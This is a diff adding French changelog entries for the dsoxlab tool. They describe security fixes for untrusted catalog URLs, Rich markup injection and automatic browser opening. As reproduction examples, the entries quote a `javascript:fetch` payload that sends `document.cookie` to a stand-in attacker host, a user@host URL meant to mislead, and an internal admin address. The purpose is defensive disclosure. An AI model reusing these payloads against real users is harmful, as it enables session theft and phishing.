@@ -119,9 +119,87 @@ et le projet suit le [versionnage sémantique](https://semver.org/lang/fr/).
 
   Mesuré sur un vrai catalogue : **179 lignes exportées sur 179 en base**, là
   où `scores` en aurait montré vingt.
+- **Une seule politique d'URL pour tout ce qu'un catalogue déclare** (issue
+  #273). Un catalogue est une entrée non fiable — `dsoxlab catalog add <url>`
+  clone un dépôt git arbitraire — et ses URL étaient traitées comme du contenu.
+  Reproduit avant d'être corrigé, sur un lab déclarant
+  `doc_url: "javascript:fetch('https://attaquant.test/'+document.cookie)"` :
+  `dsoxlab guide --print` rendait la valeur telle quelle, paramètres de campagne
+  greffés, et sans `--print` elle atteignait `webbrowser.open()`.
+
+  `validate-structure` contrôle bien ce champ. Il n'est pas une barrière de
+  sécurité : il n'est ni automatique, ni exigé avant d'utiliser un catalogue. Le
+  contrôle est désormais rejoué **au point d'usage**, par une primitive unique
+  (`src/dsoxlab/security/urls.py`) qui analyse réellement l'URL, exige un hôte,
+  refuse `utilisateur:motdepasse@`, refuse les caractères de contrôle, et refuse
+  tout schéma hors de sa politique — `javascript:`, `data:`, `file:`, `ftp:`,
+  `ssh:`, et tout gestionnaire de protocole installé sur la machine.
+
+  Deux politiques, déclarées plutôt que réimplémentées : les URL de
+  documentation et d'issues acceptent `http` et `https`, un portail de preuves
+  n'acceptera que `https`. Un seul analyseur, pour que la plus permissive ne
+  devienne pas la règle en silence. `doc_url`, `repo.issues_url` et l'URL
+  dérivée du remote git d'un catalogue y passent toutes, et #269/#270 la
+  réutiliseront au lieu d'écrire un troisième contrôle.
+
+  **Aucune sonde réseau.** Rien ne résout de nom, n'ouvre de connexion et ne
+  suit de redirection pour décider si une URL est acceptable — sinon un
+  catalogue déclarant `doc_url: http://192.168.1.1/admin` ferait émettre cette
+  requête depuis votre poste, ou depuis le runner de CI.
+  `validate-structure --check-urls` reste ce qu'il était : un contrôle réseau
+  volontaire et explicite.
+
+  Le modèle est écrit une seule fois, dans
+  [docs/security.fr.md](./docs/security.fr.md), y compris ce dont il ne protège
+  **pas** — les playbooks et les tests d'un lab tournent avec vos privilèges, et
+  aucune validation d'URL n'y change rien.
+
+### Modifié
+
+- **`dsoxlab guide` n'ouvre plus le navigateur de lui-même** (issue #273). Une
+  URL syntaxiquement sûre n'est pas une destination approuvée : l'adresse vient
+  du catalogue, et la décision d'y aller revient au lecteur. La commande affiche
+  l'URL, et `--open` l'ouvre. `--print` continue de marcher et vaut désormais le
+  défaut, raison pour laquelle il reste : les scripts s'en servent.
+
+  `support --issue` demandait déjà avant d'ouvrir, et continue, avec une
+  destination validée par la même politique.
 
 ### Corrigé
 
+- **Un caractère dans un catalogue rendait tout le catalogue inaffichable**
+  (issue #273). Mesuré avant le correctif, sur un lab déclarant
+  `title: "Titre [red]hostile[/red] et [/] non apparié"` :
+
+  ```text
+  $ dsoxlab list-labs
+  MarkupError: closing tag '[/]' at position 28 has nothing to close
+  $ dsoxlab show casse
+  MarkupError: closing tag '[/]' at position 113 has nothing to close
+  ```
+
+  Les deux commandes sortaient en trace Python. Les valeurs du contrat étaient
+  interpolées dans du balisage Rich, si bien qu'un catalogue pouvait aussi
+  colorer ce qu'il voulait, poser un hyperlien `[link=…]` où il voulait — la
+  cible de l'un n'est pas ce que l'œil lit — ou renommer la fenêtre du terminal
+  avec une séquence `OSC`.
+
+  Les valeurs du contrat sont maintenant échappées là où elles sont rendues, les
+  caractères de contrôle et les surcharges de direction sont remplacés, et
+  `show` affiche l'adresse du guide en texte brut au lieu d'un lien cliquable.
+  La console porte en plus un filet : un balisage qu'elle ne sait pas analyser
+  est rendu littéralement au lieu de lever. Les deux comptent — le filet couvre
+  les points d'affichage que personne n'a encore pensé à protéger, ce qui est
+  précisément là que se trouvera le prochain défaut.
+
+  Trouvé ainsi, après le premier correctif : le titre de section du `meta.yml`,
+  affiché par `progress`, était encore interprété.
+- **`repo.issues_url` était contrôlée par préfixe** (issue #273). Un
+  `startswith(("http://", "https://"))` aurait accepté
+  `https://vrai-site.test@attaquant.test/issues`, où l'œil lit le premier nom et
+  le navigateur va au second. Le champ passe désormais par la politique d'URL,
+  et une valeur refusée retombe sur le remote git comme avant — un rapport de
+  diagnostic ne se perd pas parce qu'un catalogue a mal déclaré où l'envoyer.
 - **Une coupure de réseau était rendue comme un défaut de lab, et la même URL
   était demandée une fois par lab** (issue #224). `validate-structure
   --check-urls` a fait passer une CI verte au rouge sur quatre guides déclarés
